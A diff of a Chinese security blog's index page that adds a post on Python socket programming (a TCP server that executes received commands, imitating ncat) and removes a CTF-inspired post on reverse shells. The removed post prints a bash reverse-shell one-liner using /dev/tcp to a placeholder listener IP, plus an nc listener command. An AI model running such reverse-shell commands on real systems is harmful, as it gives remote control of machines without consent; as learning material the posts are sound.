@@ -90,6 +90,62 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/08/08/Socket套接字编程学习/"> 
+                    Socket套接字编程学习 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-08   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/">tcp</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近接触到socket模块，练一下python能力，写一个通过socket（套接字）的tcp的连接，执行命令并回显。模拟ncat的正向连接功能</p>
+<h2 id="Socket套接字"><a href="#Socket套接字" class="headerlink" title="Socket套接字"></a>Socket套接字</h2><p>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口</p>
+<p>套接字用（IP地址：端口号）表示。例如：192.168.1.1:8080</p>
+<p>它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。</p>
+<h2 id="TCP-IP协议的三种套接字类型："><a href="#TCP-IP协议的三种套接字类型：" class="headerlink" title="TCP/IP协议的三种套接字类型："></a>TCP/IP协议的三种套接字类型：</h2><p>流式套接字（SOCK_STREAM）：<br>流式套接字用于提供面向连接、可靠的数据传输服务。该服务将保证数据能够实现无差错、无重复发送，并按顺序接收。流式套接字之所以能够实现可靠的数据服务，原因在于其使用了传输控制协议，即TCP（The Transmission Control Protocol）协议。</p>
+<p>数据报套接字（SOCK_DGRAM）：<br>数据报套接字提供了一种无连接的服务。该服务并不能保证数据传输的可靠性，数据有可能在传输过程中丢失或出现数据重复，且无法保证顺序地接收到数据。数据报套接字使用UDP（User Datagram Protocol）协议进行数据的传输。由于数据报套接字不能保证数据传输的可靠性，对于有可能出现的数据丢失情况，需要在程序中做相应的处理。</p>
+<p>原始套接字（SOCK_RAW）：<br>原始套接字(SOCKET_RAW)允许对较低层次的协议直接访问，比如IP、 ICMP协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为RAW SOCKET可以自如地控制Windows下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过RAW SOCKET来接收发向本机的ICMP、IGMP协议包，或者接收TCP/IP栈不能够处理的IP包，也可以用来发送一些自定包头或自定协议的IP包。网络监听技术很大程度上依赖于SOCKET_RAW<br>原始套接字与标准套接字（标准套接字指的是前面介绍的流式套接字和数据报套接字）的区别在于：原始套接字可以读写内核没有处理的IP数据包，而流式套接字只能读取TCP协议的数据，数据报套接字只能读取UDP协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。</p>
+<h2 id="编程思路"><a href="#编程思路" class="headerlink" title="编程思路"></a>编程思路</h2><h3 id="tcp服务端"><a href="#tcp服务端" class="headerlink" title="tcp服务端"></a>tcp服务端</h3><p>1、创建一个套接字，选择tcp流通信，并且绑定套接字到本地ip和端口</p>
+<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind()</code></pre><p>2、开始监听</p>
+<pre><code>s.listen(5) # 一般5的最大连接就够了</code></pre><p>3、循环接收客户端连接要求</p>
+<pre><code>while True:
+    conn,addr=s.accept() # 接收tcp连接，并返回一个新的套接字conn，和ip地址addr</code></pre><p><strong>这个套接字的作用：</strong><br>作为介质，用来接收客户端的信息、返回给客户端信息。服务端在接收这个conn套接字后跟客户端共用此套接字。</p>
+<p>4、执行接收的命令，结果的数据返回给客户端。</p>
+<p>5、传输完毕关闭套接字</p>
+<h3 id="tcp客户端"><a href="#tcp客户端" class="headerlink" title="tcp客户端"></a>tcp客户端</h3><p>1、创建一个套接字并连接远端</p>
+<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect()</code></pre><p>2、 连接后发送数据和接收数据</p>
+<p>3、 传输完毕关闭套接字</p>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPTxA.jpg" alt></p>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPbrt.md.jpg" alt></p>
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPo2d.png" alt></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>(Python Socket 编程详细介绍)[<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71]" target="_blank" rel="noopener">https://gist.github.com/kevinkindom/108ffd675cb9253f8f71]</a></p>
+<p>(python socket编程详细介绍Ⅱ)[<a href="http://blog.51cto.com/yangrong/1339593]" target="_blank" rel="noopener">http://blog.51cto.com/yangrong/1339593]</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/08/08/Socket套接字编程学习/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/08/07/LFI with phpinfo测试/"> 
                     LFI with phpinfo测试 
                 </a>
@@ -951,58 +1007,6 @@ shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.c
             </div>
             <div class="continue">
             <a href="/2018/06/23/CTF中的Misc题目/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/06/21/Nc反弹Shell初识/"> 
-                    Nc反弹Shell 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-06-21   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/反弹shell/">反弹shell</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>昨天打了sctf，太菜了还是从基础开始来吧，看到Bugku有一道命令执行的题目，因为没有回显要反弹到vps，由此接触到了反弹Shell这个东西</p>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>有一台centOS7的vps主机当作控制、接受机器，一台kali linux的内网虚拟机当作靶机。一开始vps开了端口，靶机怎么也连接不上。后来请教line师傅，他说vps要看防火墙的放行端口，然后我Google了vutlr机器的放行端口是全部Ban掉的。。。尼玛，贴一个用firewalld开防火墙端口的<a href="http://www.cnblogs.com/moxiaoan/p/5683743.html" target="_blank" rel="noopener">文章</a></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://p3.ssl.qhimg.com/t019632a21686694291.png" alt="1"><br>目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。</p>
-<h3 id="bash-直接反弹"><a href="#bash-直接反弹" class="headerlink" title="bash 直接反弹"></a>bash 直接反弹</h3><ol>
-<li><p>主机执行监听命令:</p>
-<pre><code>nc -l -p 8080 -vvv</code></pre></li>
-<li><p>靶机执行bash反弹命令：</p>
-<pre><code>root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</code></pre></li>
-</ol>
-<p><img src="https://s1.ax1x.com/2018/06/21/PSG5GD.jpg" alt="kaiqi"><br><img src="https://s1.ax1x.com/2018/06/21/PSGIRe.png" alt="xiaoguo"></p>
-<ol start="3">
-<li>可以看到，我们在主机输入whoami，命令会传到靶机执行，然后返回信息到主机。相当于靶机的shell反弹到了主机。</li>
-</ol>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>反弹shell有十种方法，这里有两篇文很不错，再贴上一篇nc命令的讲解：<br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">linux各种一句话反弹shell总结</a></p>
-<p><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
-<p><a href="https://www.cnblogs.com/chengd/p/7565280.html" target="_blank" rel="noopener">Linux每天一个命令：nc/ncat</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/06/21/Nc反弹Shell初识/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
